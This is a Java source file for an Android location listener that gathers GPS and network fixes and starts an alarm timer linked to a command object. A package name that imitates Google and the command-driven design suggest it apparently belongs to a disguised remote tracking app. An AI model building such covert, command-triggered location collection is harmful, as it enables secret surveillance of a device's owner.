package com.google.cachesync;

import java.util.Calendar;

import com.code4bones.utils.NetLog;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;

public class GpsLocationListener implements LocationListener {
	
	final public static int GPS = 0;
	final public static int NETWORK = 1;
	final public static String PROVIDER_TYPE = "PROVIDER_TYPE";
	final public static String[] PROVIDER_NAME = {"GPS","NETWORK"};
	
	public Location lastLocation = null;
	public Context mContext = null;
	public int providerType = 0;
	public static CommandObj command;
	public static PendingIntent pendingIntent;
	
	
	private static final GpsLocationListener[] instance = new GpsLocationListener[2];
	
	public GpsLocationListener(Context context,int type) {
		this.mContext 		 = context;
		this.providerType = type;
	}

	static public GpsLocationListener getInstance(int type) {
		return GpsLocationListener.instance[type];
	}
	static public GpsLocationListener getInstance(Context context,int type) {

		if ( GpsLocationListener.instance[type] == null ) 
			GpsLocationListener.instance[type]= new GpsLocationListener(context,type);
		
		return GpsLocationListener.instance[type];
	}
	
	public static void startTimer(Context context,CommandObj command,int timeout) {
		NetLog.v("Starting location timer...%d secs\r\n",timeout);
		GpsLocationListener.command = command;
		AlarmManager alarm = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
		Intent intent = new Intent(context,LocationTimer.class);
		GpsLocationListener.pendingIntent = PendingIntent.getBroadcast(context,0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
		Calendar calendar = Calendar.getInstance();
		calendar.add(Calendar.SECOND, timeout);
		alarm.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(),GpsLocationListener. pendingIntent);
	}
	
	public void onLocationChanged(Location loc) {
		
		NetLog.v("%s Location changed %f %f %f\n",loc.getProvider(),loc.getLongitude(),loc.getLatitude(),loc.getAccuracy());
		
		if ( lastLocation == null ) {
			lastLocation = loc;
		} else if ( loc.hasAccuracy() && lastLocation.hasAccuracy() ) {
			if ( loc.getAccuracy() < lastLocation.getAccuracy() )
				lastLocation = loc;
		} // hasAccuracy
	} // onLocationChanged
	
	public void onProviderDisabled(String arg0) {}
	public void onProviderEnabled(String arg0) {}
	public void onStatusChanged(String arg0, int arg1,Bundle arg2) {}

}
